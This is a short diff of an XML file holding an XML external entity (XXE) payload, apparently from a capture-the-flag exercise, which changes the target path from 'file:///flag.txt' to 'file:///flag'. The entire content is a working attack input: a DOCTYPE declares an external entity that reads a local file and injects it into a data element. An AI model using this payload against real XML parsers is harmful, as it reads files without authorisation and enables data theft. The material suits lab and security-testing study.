@@ -1,4 +1,4 @@
 <!DOCTYPE foo [
    <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM  "file:///flag.txt" >]>
+   <!ENTITY xxe SYSTEM  "file:///flag" >]>
 <root><data>&xxe;</data></root>
